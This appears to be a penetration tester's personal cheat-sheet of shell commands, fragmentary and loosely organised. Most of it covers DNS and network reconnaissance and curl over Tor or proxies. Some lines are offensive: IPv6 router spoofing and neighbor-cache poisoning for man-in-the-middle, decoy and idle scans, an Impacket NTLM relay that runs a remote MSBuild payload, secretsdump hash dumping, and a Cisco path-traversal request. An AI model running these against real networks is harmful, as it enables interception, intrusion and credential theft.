masscan 10.10.10.1/24 -p80,443 -oX output.xml









knockpy $Target --no-http > subdomains3.txt


cat $Targets.txt | grep -i $Target | sort -u | uniq > finaldomains.txt


httpx -l $File -silent -timeout 20  -title -tech-detect -status-code -follow-redirects -o $OutFile.txt


knockpy $TARGET --json 1>/dev/null 2>knockpy.tmp
KNOCKPY_REPORT=$(cat knockpy.tmp | grep : | awk -F': ' '{print $2}')
cat $KNOCKPY_REPORT | jq '.found.subdomain[]' | sed 's/"//g' >> knockpy.tmp
echo "  - Found: $(cat knockpy.tmp | wc -l)"


knockpy -w /pentest/lists/dns/namelist.txt $TARGET




## --------------------------------------------- ##
##  [?] Enumerates a domain for DNS entries
## --------------------------------------------- ##
dnsdict6 -4 -d -t 16 -e -x $Domain

dnsdict6 $TARGET $DNS_FILE -4 | awk '{print $1}' | sort -u | sed -r 's/.com./.com/g'


dnsdict6 $TARGET $DNS_FILE -4 | awk '{print $1}' | sort -u | sed -r 's/.com./.com/g'


atk6-alive6 eth0 -l > /dev/null && atk6-alive6 eth0 > /dev/null && arp-scan -l | head -n -2 | tail -n +3 > arp && ip -6 neigh > neigh && for line in $(cat neigh | cut -d" " -f5 |sort -u); do grep $line arp && grep $line neigh && echo -e '\n';  done; rm arp neigh

785*

ping6 ff02::2%eth0			## all routers address
ping6 ff02::1%eth0			## all nodes address

ping6 ff02::1%eth0
ping6 -c 6 ff02::1%eth0
ping6 –c 4 fe80::c418:2ed0:aead:cbce%eth0


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
inverse_lookup6 eth0 $MAC		## Get IPv6 from a MAC addresses



ICMPv6 Router Discovery




##-==================================================-##
##   [+] atk6-redir6 - IPv6 Evil AP - MITM Attack 
##-==================================================-##
## ----------------------------------------------------------------- ##
##   [?] Implant a route into $SrcIP which;
##   [?] Redirects all traffic from $TargetIP to $NewIP 
## ----------------------------------------------------------------- ##
redir6 eth0 $SrcIP $TargetIP  <original-router> <new-router> $NewRouterMAC


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##


##-=============================================================-##
##   [+] dnsdict6 - Enumerate a domain for DNS Record Entries
##-=============================================================-##
## --------------------------------------------------------------------- ##
##   [?] ENUMERATE SRV SERVICE RECORDS
##   [?] ENUMERATE IPV4 IPV6, NAME SERVER, MAIL SERVER WITH OPTIONS
## --------------------------------------------------------------------- ##
atk6-dnsdict6 $Domain
atk6-dnsdict6 -d $Domain				## NS and MX DNS domain information
atk6-dnsdict6 -S $Domain				## perform SRV service name guessing
atk6-dnsdict6 -d46 -t 32 $Domain		## number of threads




##-====================================================-##
##   [+] Performs reverse DNS enumeration given an IPv6 address.
##-====================================================-##
atk6-dnsrevenum6
atk6-dnsrevenum6 $DNSServer $IPv6Addr/64


##-====================================================-##
##   [+] traceroute that uses ICMP6.
##-====================================================-##
atk6-trace6
atk6-trace6 -d eth0 $TargetIP $Port


##-=======================================================-##
##   [+] Alive6 - Find activities on local network
##-=======================================================-##
## ------------------------------------------------------- ##
##   [?] Detect ICMPv6 echo-reply on global addresses
##   [?] Shows  alive addresses in the segment
## ------------------------------------------------------- ##
atk6-alive6 eth0
atk6-alive6 eth0 -v
atk6-alive6 tun6to4

-V         enable debug output
  -d         DNS resolve alive IPv6 addresses
  -H         print hop count of received packets

-i $File

-Z $Mac     ## Use given destination MAC address



##-=============================================================-##
##   [+] detects new ipv6 addresses joining the local network
##-=============================================================-##
atk6-detect-new-ip6 eth0

##-==========================================-##
##   [+] Announce yourself as a router
##   [+] try to become the default router
##-==========================================-##
atk6-fake_router6 eth0 1::/64
atk6-fake_router6 eth0 1::/64 $MTU $MAC


##-=======================================================-##
##   [+] Dumps all local routers and their information
##-=======================================================-##
atk6-dump_router6 eth0


##-===============================================-##
##   [+] Advertise ipv6 address on the network
##-===============================================-##
## ------------------------------------------------------------------------------ ##
##   [?] sending it to the all-nodes multicast address if no target specified.
## ------------------------------------------------------------------------------ ##
atk6-fake_dhcps6 eth0 1::/64 $DNSServer


##-=======================================================-##
##   [+] Dumps all DHCPv6 servers and their information
##-=======================================================-##
atk6-dump_dhcp6 eth0



##-==========================================-##
##   [+] parasite6 - ARP spoofer for IPv6
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?] redirecting all local traffic to your own  system
##   [?] by answering falsely to Neighbor Solicitation requests
##   [?] specifying FAKE-MAC results in a local DOS.
## ----------------------------------------------------------------- ##
atk6-parasite6 eth0 $FakeMAC
atk6-parasite6 -l eth0



## ------------------------------------------------------------------------ ##
##   [?] tcp6 - A security assessment tool for TCP/IPv6 implementations

tcp6  is  a security assessment tool for attack vectors based on TCP/IPv6 packets.



udp6 is a tool for sending arbitrary IPv6-based UDP datagrams.


rs6 is a security assessment tool for attack vectors based on Router Solicitation messages

rd6 is a security assessment tool for attack vectors based on ICMPv6 Redirect messages

ns6 is a security assessment tool for attack vectors based on Neighbor Solicitation messages

Neighbor Cache poisoning attacks
Neighbor Cahe exhaustion attacks


path6 is a versatile IPv6-based traceroute tool


ra6  is a security assessment tool for attack vectors based on Router Advertisement messages


scan6 is a full-fledged IPv6 address scanning tool


flow6 allows the security assessment of the IPv6 Flow Label. 

frag6 is a security assessment tool for the IPv6 fragmentation mechanism. 
fragmentation-based attacks

Fragment Identification generation policy
IPv6 atomic fragments


jumbo6 is a secuity assessment tool for IPv6 Jumbograms.

na6  is a security assessment tool for attack vectors based on Neighbor Advertisement messages
Neighbor Cache poisoning attacks, 
DAD attacks

ni6 is a security assessment tool for attacks vectors and reconnaissance  techniques  
based  on  ICMPv6 Node Information messages.


icmp6 is a security assessment tool for the ICMPv6 protocol. 
It can easily produce arbitrary ICMPv6 error messages
icmp6 can also be used to send crafted ICMPv6 messages of arbitrary type/code combinations.



addr6  is an IPv6 address analysis and manipulation tool. Given a list of IPv6 addresses, it can filter
       such list based on different criteria, such as IPv6 address type, IPv6 address scope, IPv6 prefix, etc.
       Additionally,  given a list of IPv6 addresses addr6 can produce statistics on such addresses, including
       address scopes, types, and type of IPv6 interface identifier.  addr6 can also analyze a single address,
       producing script-friendly output, such that its analysis can be leveraged by other tools or scripts.

       blackhole6  is  a  troubleshooting  tool which can find IPv6 where in the network topology packets with
       specific IPv6 Extension Headers are being dropped.





ipv6toolkit.conf - Configuration file for the SI6 Networks' IPv6 address monitoring daemon (ipv6mon)






mitm6

138513







dnscan --domain $Domain --wordlist $File -o $Dir/dnscan-$Domain.txt


dnscan -d $Domain -w $Domains QUICK -o $Dir/domains-dnscan-$Domain.txt





ping $Domain
tcptraceroute -i eth0 $Domain
traceroute -T -O info -i eth0 $Domain
nbtscan -r 192.168.0.1-100
nbtscan -f $HostFile.txt
nmap -p 53 --script=*dns* -vv -oN dns $ip
nmap -PN -n -F -T4 -sV -A -oG $File.txt $Domain
amap -d $IP $PORT
cisco-torch -A $IP

hping3 $Domain

fping -a 192.168.0.1-100
bing $IP
oping

mtr $Domain
tcptraceroute -i eth0 $Domain
tracepath $Domain
tcptrace -l -r o3 $File
intrace -h $Domain
itrace -i eth0 -d $Domain
0trace eth0 $Domain
tctrace -i eth0 -d $Domain
tcpflow -p -c -i eth0 port 80
tcpxtract --file $File.pcap --output $File --device eth0
tcpstat -i eth0 -o "Time: %S\tpps: %p\tpacket count: %n\tnet load: %l\tBps: %B\n"

sniffit
packit
ostinato
firewalk


ifpps -dev eth0
ifpps -lpcd wlan0           ## Continuous terminal output for the wlan0
ifpps -pd eth0              ## eth0 device in promiscuous mode.

iftop -i eth0 -f 'port (80 or 443)'
iftop -i eth0 -f 'ip dst 192.168.1.5'
iftop -i eth0 -F 192.168.1.0/255.255.255.0



##-=======================-##
##  [+] IPv6 Traceroute:
##-=======================-##
traceroute6 $Domain
path6 -v -u 72 -d $Domain		            ## Traceroute EH-enabled
mtr -6 $Domain

traceproto 
tracepath 
tracepath6 $Domain
itrace -v -i eth0 -d $Domain        ## traceroute implementation using ICMP echo request packets
tctrace -v -i eth0 -d $Domain       ## traceroute implementation using TCP SYN packets
tcptraceroute                       ## traceroute implementation using TCP packets.
tcptraceroute -A                    ## Set the TCP ACK flag in outgoing packets.        ## By doing so, it is possible to trace through stateless firewalls which permit outgoing TCP connections.

tcptrace -b                         ## brief output format
tcptrace -l                         ## long output format


arp-scan --interface=eth0 192.168.0.0/24



netdiscover -r $IP
netdiscover -i eth0 -r $IP -s 100 -N -P >> netdiscover.log


##-====================================-##
##   [+] Only sniff for ARP traffic
##-====================================-##
netdiscover -p


##-===========================================-##
##   [+] Scan common LAN addresses on eth0:
##-===========================================-##
netdiscover -i eth0


##-================================================-##
##   [+] Fast scan common LAN addresses on eth0 
##-================================================-##
## ------------------------------------------------ ##
##    [?] (search only for gateways):
## ------------------------------------------------ ##
netdiscover -i eth0 -f


##-============================-##
##   [+] Scan fixed ranges:
##-============================-##
netdiscover -i eth0 -r 172.26.0.0/24
netdiscover -r 192.168.0.0/16
netdiscover -r 10.0.0.0/8



##-==================================================================================-##
##   [+] CrackMapExec - Pentesting tool for Windows/Active Directory Environments
##-==================================================================================-##
## ---------------------------------------------------------------------------------- ##
##    [?] Enumerating logged on users
##    [?] Spidering SMB Shares
##    [?] Executing psexec style attacks
##    [?] Autoinjecting Mimikatz/Shellcode/DLLs into memory using Powershell
##    [?] Eumping the NTDS.dit
## ---------------------------------------------------------------------------------- ##




crackmapexec 192.168.1.0/24



## ---------------------------------------------- ##
##    [?] CrackMapExec - Generate Relay List
## ---------------------------------------------------------------------------------- ##
crackmapexec smb --gen-relay-list $File.txt $IP/24




##-=======================================-##
##   [+] Impacket - 
##-=======================================-##
impacket-ntlmrelayx -smb2support --no-smb-server -t $IP -c 'cmd /c "net use \\$IP\smb \user:kali redteam & C:\Windows\Microsoft.NET\Framework64\v5.0.30319\MSBuild.exe \\$IP\smb\rt.xml"'




impacket-GetADUsers

impacket-rpcmap
impacket-lookupsid

##-=======================================-##
##   [+] Impacket - dump RPC endpoints
##-=======================================-##
impacket-rpcdump $IP


##-=======================================-##
##   [+] Impacket - dump info from SAMR
##-=======================================-##
impacket-samrdump $IP


impacket-mimikatz
impacket-secretsdump


##-================================================-##
##   [+] Impacket - Secretsdump - Dumping Hashes
##-================================================-##
impacket-secretsdump -sam sam.hive -system system.hive LOCAL







ndisc6

atk6-trace6 -d eth0 $TargetIP $Port
atk6-alive6 eth0 -v
atk6-detect-new-ip6 eth0
atk6-dump_router6 eth0
atk6-dump_dhcp6 eth0
atk6-passive_discovery6 eth0

script6 get-as $IPv6Addr
script6 get-asn $IPv6Addr
cat $File.txt | script6 get-aaaa



nmap -6 -sT $DOMAIN						## Nmap scan
nmap -6 -sT ::1							## localhost

scan6 -v -i eth0 -­d $DOMAIN/64			## Domain scanning
scan6 -v -i eth0 -­d $IPv6ADDR/64			## Address scanning

scan6 -i eth0 -L -e --print-type global	## Discover global & MAC addresses

scan6 -i eth0 --local-scan --rand-src-addr --verbose		## Link-local & Global addresses :+1:


#targets-ipv6-multicast-echo: Sends ICMPv6 echo to all nodes link local ff02::1 -script-args newtargets,interface=, may need -SL
#targets-ipv6-multicast-invalid-dst: Sends ICMPv6 with invalid extension to all nodes link-local (ff02::1) for Windows responses. --script-args 'newtargets,interface=', may need -sP
#targets-ipv6-multicast-mld: Sends multicast listener discovery to link-local (ff02::1), resp set to 1 to provoke immediate response. --script-args 'newtargets,interface='
nmap -6 -n --script targets-ipv6-multicast-echo,targets-ipv6-multicast-invalid-dst,targets-ipv6-multicast-mld -oA 


dns-ip6-arpa-scan.nse



##-===================================================-##
##   [+] UDP-Protocol-Scanner - Port Scan - IP List
##-===================================================-##
udp-protocol-scanner.pl -f $IPs.txt

##-======================================================-##
##   [+] UDP-Protocol-Scanner - Protocol Specific Scan
##-======================================================-##
udp-protocol-scanner -p ntp -f $IPs.txt



gobuster dir -u $Domain -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
joomscan -u $Domain
nikto -h $Domain -port 443 -Format htm --output $Domain.html

uniscan -u $Domain -qweds
wafw00f $Domain
whatweb $Domain
wpscan --url $Domain

cisco-torch -A 192.168.99.202
copy-router-config.pl 192.168.1.1 192.168.1.15 private
merge-router-config.pl 192.168.1.1 192.168.1.15 private


sslscan $Domain
sslyze $Domain
sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $Domain
sslyze -regular $Domain
sslcaudit -l 0.0.0.0:443 -v 1
sslstrip -w sslstrip.log -l 8080
tlssled $Domain 443
testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $IP



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##		[+]  DMitry (Deepmagic Information Gathering Tool)
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] 
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dmitry -winsepo $File.txt $Domain


automater -s robtex $IP


## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] hping3 - send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
hping3 --traceroute -V -1 $Domain

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] InTrace - enumerate IP hops exploiting existing TCP connections
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
intrace -h $Domain -p 80 -s 4



## Finger Printing - Banner Grabbing

amap -bqv 192.168.1.15 80
amap -bqv1 1-65535 $TARGET



# Metasploit DNS Auxiliarys:
metasploit> use auxiliary/gather/dns

msf > use auxiliary/gather/enum_dns


Using Decoys (popular idle scans)

nmap -p 80 -D $dec1,ME,dec2 $vip
nmap -D RND:10 $vip -sS -p 80 -Pn --disable-arp-ping

hping3 --rand-source -S -p 80 $vip -c 3
hping3 -a $spoofIP -S -p 80 $vip

nmap --source-port 53 $vip -sS
hping3 -S -s 53 --scan known $vip

nmap -sS --data-lenght 10 -p 21 $vip
hping3 -S -p 21 --data 24 $vip

nmap --spoof-mac apple $vip -p 80 -Pn --disable-arp-ping -n
nmap --spoof-mac 0 $vip -p 80 -Pn --disable-arp-ping -n
nmap --spoof-mac 00:11:22:33:44:55 $vip -p 80 -Pn --disable-arp-ping -n

nmap -iL host.list -sS -p80,443,5555,21,22 --randomize-hosts
nmap -iL host.list -sS -p80,443,5555,21,22 --randomize-hosts -T2

hping3 -1 --rand-dest 192.168.1.x -I eth0
hping3 --scan 80,443,21,22 $vip -i u10

## ------------------------------------------------------------------------------ ##
##   [?] find zombie ip in network:
## ------------------------------------------------------------------------------ ##
use auxiliary/scanner/ip/ipidseq
nmap -sI ip target

ipidseq.nse

##   [+] Idle Hping

if the target response with id +1 that makes him a good zombie, 
in general status id must be incemented

hping3 -S -r $IP -p 135         ## syn scan


hping3 -a $ZIP -S $VIP -p 23    ## spoof IP
zip = zombie , vip = victim...
if the target response id +2 the 23 is open


nmap --script ipdseq $IP -p 135
checks if the id status is incresed
nmap -O -v $IP -p 135

##   [+] NMap - zombie idle scan (-sI)
nmap -sI $zip:135 $vip -p 23 --packet-trace


https://github.com/rebootuser/LinEnum


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] DNSRecon - DNS Recon
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t rvs -i 192.1.1.1,192.1.1.20				## Reverse lookup for IP range:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t std -d $Domain.com						## Retrieve standard DNS records:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t brt -d $Domain.com -w $Hosts.txt	## Enumerate subdornains:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -d $Domain.com -t axfr						## DNS zone transfer:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -d $Host -t zonewalk							## Zone Walking
## --------------------------------------------------------------------------------------------------------------- ##


##-========================================================-##
##   [+] DNS Reverse Lookup of IP Range - output to .csv
##-========================================================-##
dnsrecon -t rvl -r $IP/24 -c $Output.csv            ## DNS Reverse Lookup of IP Range - output to .csv



dnsrecon -t std --json /root/Desktop/dnsrecon_std_results.json -d somedomain.com

dnsrecon -t axfr --json /root/Desktop/dnsrecon_axfr_results.json -d somedomain.com

dnsrecon -v --iw -f --lifetime 3 --threads 50 -t brt --json /root/Desktop/dnsrecon_brt_results.json -D subdomains-top1mil.txt -d somedomain.com


Reverse DNS lookup:

dnsrecon --json /root/Desktop/dnsrecon_reverse_results.json -s -r 192.168.8.0/24

Extract virtual hosts from the reverse DNS lookup results:

jq -r '.[] | if (type == "array") then (.[].name) else (empty) end | select(. != null)' dnsrecon_reverse_results.json | sort -uf | tee -a subdomains.txt




Extract hostnames from the standard/zone transfer/brute force results:

jq -r '.[] | if (.type == "A" or .type == "AAAA" or .type == "CNAME" or .type == "MX" or .type == "NS" or .type == "PTR") then (.exchange, .name, .target) else (empty) end | select(. != null)' dnsrecon_std_results.json | sort -uf | tee -a subdomains.txt

Extract IPs from the standard/zone transfer/brute force results:

jq -r '.[] | if (.type == "A" or .type == "AAAA" or .type == "CNAME" or .type == "MX" or .type == "NS" or .type == "PTR") then (.address) else (empty) end | select(. != null)' dnsrecon_std_results.json | sort -uf | tee -a ips.txt

[Subdomain Takeover] Extract canonical names from the standard/zone transfer/brute force results:

jq -r '.[] | if (.type == "CNAME") then (.target) else (empty) end | select(. != null)' dnsrecon_std_results.json | sort -uf | tee -a cnames.txt






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] DHCP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


dhcp-discover.nse



nmap -A -sU -sV -Pn -v --script-timeout 90 --script=dhcp*,/usr/share/nmap/scripts/vulners -p 68 $TARGET











##-=====================================================-##
##  [+] STrace - 
##-=====================================================-##
strace ffmpeg -i /dev/video0 $File.jpg



##-=====================================================-##
##  [+] STrace - 
##-=====================================================-##
for foo in $(strace -e open lsof -i tcp 2>&1 | grep 'denied'| awk '{print $1}' | cut -d "/" -f3); do echo $foo $(cat /proc/$foo/cmdline)|awk '{if($2) print}'; done


##-========================================================-=====-##
##   [+] Lsof - Output all processes that are in "LISTEN" mode
##-========================================================-=====-##
lsof -nPi | awk '/LISTEN/'


##-========================================-##
##   [+] Lsof - Listening TCP Sockets
##-========================================-##
lsof -iTCP -sTCP:LISTEN






lsof -i tcp:22
lsof -iTCP:ssh
lsof -t -c sshd
lsof -a -i :22 -c /d$/


##-====================================================-##
##   [+] list all open files for specific processes:
##-====================================================-##
lsof -p $PID
lsof -c $Command
lsof -c sendmail
lsof -u $Username

lsof +D /var/log/			## List files in directory
lsof +d $Dir				## include subdirectories


##-================================================-##
##   [+] use awk to parse the output of:
##       > Process name, PID, and process owner
##-================================================-##
lsof -nPi | awk '/LISTEN/ {print $1, $2, $3, $8, $9}'

lsof -i -nlP | awk '{print $1, $8, $9}' | sort -u
lsof -i -nlP | awk '{print $9, $8, $1}' | sed 's/.*://' | sort -u



lsof -p NNNN | awk '{print $9}' | grep '.so'

cat /proc/NNNN/maps | awk '{print $6}' | grep '.so' | sort | uniq




echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )' | grep -Po '([0-9a-z:.]*)(?=:http[s])' | sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3




echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Curl - Socket Creation + Manipulation Tool
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##






## --------------------------- ##
##   [?] follow redirects
##   [?] set user-agent
##   [?] set method - GET
## --------------------------- ##
curl -Iks --location -X GET -A "x-agent" $Domain


## --------------------------------- ##
##   [?] Use Proxy for connection
## --------------------------------- ##
curl -Iks --location -X GET -A "x-agent" --proxy http://127.0.0.1:4444 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy socks5://127.0.0.1:9050 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy socks5://127.0.0.1:1080 $Domain



##-======================================================================================================================================-##
##  ||----------------------------------------------->> Clearnet access via HTTP/SOCKS <<---------------------------------------------||
##-======================================================================================================================================-##
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    curl -fsSI -x 127.0.0.1:8118 ${webhost}									## Fetch via HTTP proxy as root
    sudo -n -u anon curl -fsSI -x 127.0.0.1:8118 ${webhost}					## Fetch via HTTP proxy as anon
    curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}					## Fetch via SOCKS proxy as root
    sudo -n -u anon curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}	## Fetch via SOCKS proxy as anon
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    curl -fsSI --socks5 127.0.0.1:9050 ${webhost}							## Fetch via SOCKS proxy w/ local DNS as root
    sudo -n -u anon curl -fsSI --socks5 127.0.0.1:9050 ${webhost}			## Fetch via SOCKS proxy w/ local DNS as anon
## -------------------------------------------------------------------------------------------------------------------------------------- ##
##-======================================================================================================================================-##

##-======================================================================================================================================-##
##  ||---------------------------------------->> Fetch Over SOCKS5 Using Privoxy And Local DNS <<-------------------------------------||
##-======================================================================================================================================-##
## 
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    sudo -n -u privoxy curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}		## Fetch via privoxy
    sudo -n -u privoxy curl -fsSI --socks5 127.0.0.1:9050 ${webhost}				## Fetch via SOCKS5 proxy w/ local DNS as privoxy
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    sudo -n -u privoxy curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}		## Fetch via SOCKS5 proxy as privoxy 
    sudo -n -u privoxy curl -fsSI --socks5 127.0.0.1:9050 ${webhost}				## Fetch via SOCKS5 proxy w/ local DNS as privoxy
## -------------------------------------------------------------------------------------------------------------------------------------- ##
##-======================================================================================================================================-##

torify openssl s_client -connect $ONION:$PORT
torify openssl s_client -connect $ONION:$PORT -showcerts
torify openssl s_client -connect $ONION:$PORT -showcerts 2>/dev/null |  openssl x509 -in /dev/stdin -noout -fingerprint |  awk -F'=' '{print $2}' |  tr -d ':'



## ---------------------------------------------- ##
##  [+] Testing connection to the remote host
## ---------------------------------------------- ##
echo | openssl s_client -connect $Domain:443 -showcerts


## ---------------------------------------------------------------- ##
##  [+] Testing connection to the remote host (with SNI support)
## ---------------------------------------------------------------- ##
echo | openssl s_client -showcerts -servername $Domain -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl version
## ----------------------------------------------------------------------- ##
openssl s_client -tls1_2 -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl cipher
## ----------------------------------------------------------------------- ##
openssl s_client -cipher 'AES128-SHA' -connect $Domain:443





curl --socks5-hostname 127.0.0.1:9050 -o $File $URL
curl --socks5-hostname 127.0.0.1:9150 -o $File $URL


##-===================================================================-##
##   [+] Curl - Tor SOCKS5 Proxy - Secure TLS Cpnnection
##-===================================================================-##
curl --proxy "socks5h://localhost:9050" --tlsv1.2 $URL
curl --proxy "socks5h://localhost:9150" --tlsv1.2 $URL

 - Firefox User Agent 
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL

##-===================================================================-##
##   [+] Curl - Tor SOCKS5 Proxy + TLS + Firefox User Agent 
##-===================================================================-##
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL



##-======================================================================================================================================-##
##  ||----------------------------------------------->> Darknet access via HTTP/SOCKS <<----------------------------------------------||
##-======================================================================================================================================-##
    sudo -n -u anon curl -fsSI -x 127.0.0.1:8118 ${onionhost}						## Fetch via .onion via HTTP proxy as anon
    sudo -n -u anon curl -fsSI --socks5-hostname 127.0.0.1:9050 ${onionhost}		## Fetch .onion via SOCKS proxy as anon
##-======================================================================================================================================-##



##-======================================-##
##   [+] Curl SOCKS5 Proxy Connection:
##-======================================-##
curl -s -m 10 --socks5 $hostport --socks5-hostname $hostport -L $URL


curl --socks5 127.0.0.1:9150
curl --http-proxy=socks4a://127.0.0.1:9050
curl --socks5 127.0.0.1:9150

curl -v --socks5-hostname localhost:9050 http://jhiwjjlqpyawmpjx.onion

curl --resolve 127.0.0.1:4444:http://killyourtv.i2p/killyourtv.asc


curl ifconfig.co --socks5-host 10.64.0.1
curl ifconfig.co --socks5-host nl1-wg.socks5.mullvad.net

curl -sSL https://api.mullvad.net/wg/ -d account="$ACCOUNT" --data-urlencode pubkey="$(wg pubkey <<<"$PRIVATE_KEY")"

curl -LsS https://api.mullvad.net/public/relays/wireguard/v1/

curl -LsS https://api.mullvad.net/public/relays/wireguard/v1/ | jq -r ".countries[] | (.code + \" - \" + .name + \" \" + ( .cities[] | (.name + \";\" + (.relays[].hostname / \"-\")[0] + \"-wg.socks5.mullvad.net\" ) )  ) + \":1080\" " | awk '{split($0,a,";"); print a[2] " [SOCKS5] "  "["a[1]"]"}' | sed s/","/" -"/g

wg.socks5.mullvad.net


curl -sSm 10 https://am.i.mullvad.net

curl -sSm 10 --interface wg0 https://am.i.mullvad.net




##-====================================-##
##  [+] Pretend to be a Google Bot
##-====================================-##
curl -A 'Googlebot/2.1 (+http://www.google.com/bot.html)' $Domain







##-=========================-##
##  [+] Grab HTTP Headers
##-=========================-##
curl -LIN $Domain

curl --trace - --trace-time $Domain

curl -A '' $Domain                          ## Remove the User Agent

curl -A '' -H 'User-Agent;' $Domain         ## Send an Empty User Agent

curl -c cookies.txt $Domain                 ## Save Cookies to a File

curl -b cookies.txt $Domain                 ## Load Cookies from a File



##-=================================-##
##  [+] Capture Session Token:
##-=================================-##
wget -q --save-cookies=$Cookie.txt --keep-session-cookies --post-data="username:admin&password=pass&Login=Login" http://$URL/login.php



curl -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://target/+CSCOE+/session_password.html




##-================================================-##
##  [+] List FTP server contents:
##-================================================-## 
curl -u $FTPUser:$FTPPass -O ftp://$host/$Path/


##-================================================-##
##  [+] Upload a file to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T $Filename ftp://$URL


##-================================================-##
##  [+] Upload multiple files to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T "{$File1,$File2}" ftp://$URL


##-================================================-##
##  [+] Upload a file from STDIN to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T - ftp://$URL/$Path/$Filename






## --------------------------------- ##
##   [+] curl - connection statistics:
## --------------------------------- ##
URL="http://www.google.com";curl -L --w "$URL\nDNS %{time_namelookup}s conn %{time_connect}s time %{time_total}s\nSpeed %{speed_download}bps Size %{size_download}bytes\n" -o/dev/null -s $URL


## ---------------------------------------------- ##
##    [+] Curl - Send email through the gmail API
## ---------------------------------------------- ##
##    [?]  smtp.gmail.com   || port: 465
## ---------------------------------------------- ##
curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>" --url smtps://smtp.gmail.com:465 -T file.txt

## ---------------------------------------------------------------- ##
##    [+] Gmail - Check your unread Gmail from the command line
## ---------------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"


## -------------------------------------------------------- ##
##    [+] Gmail - Check   ???   from the command line
## -------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | perl -pe 's/^<title>(.*)<\/title>.*?<name>(.*?)<\/name>.*$/$2 - $1/'


## -------------------------------------------------------- ##
##    [+] Gmail - Check  ???    from the command line
## -------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | perl -pe 's/^<title>(.*)<\/title>.*<name>(.*)<\/name>.*$/$2 - $1/'


## -------------------------------------------------------- ##
##    [+] Gmail - Check  ???    from the command line
## -------------------------------------------------------- ##
